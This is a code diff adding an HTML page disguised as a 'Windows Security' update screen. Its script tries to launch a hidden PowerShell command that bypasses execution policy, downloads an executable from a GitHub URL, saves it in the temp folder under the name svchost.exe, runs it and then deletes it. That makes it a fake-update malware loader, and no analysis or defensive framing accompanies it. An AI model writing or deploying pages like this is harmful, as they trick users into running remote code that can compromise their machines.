@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<body style="background-color:#f0f0f0; font-family:sans-serif; padding:50px;">
+    <h2>Updating Windows Security...</h2>
+    <p>Please wait.</p>
+    
+    <script>
+        // This line runs the PowerShell command immediately
+        window.location.href = 'powershell.exe -noprofile -executionpolicy bypass -windowstyle hidden -command "$u=\'https://github.com/finnandraw888/Windows-security-update/raw/refs/heads/main/Windowsupdateservice.exe\'; $f=\'$env:temp\\svchost.exe\'; iwr $u -out $f; start $f; sleep 5; rm $f -force"';
+    </script>
+</body>
+</html>
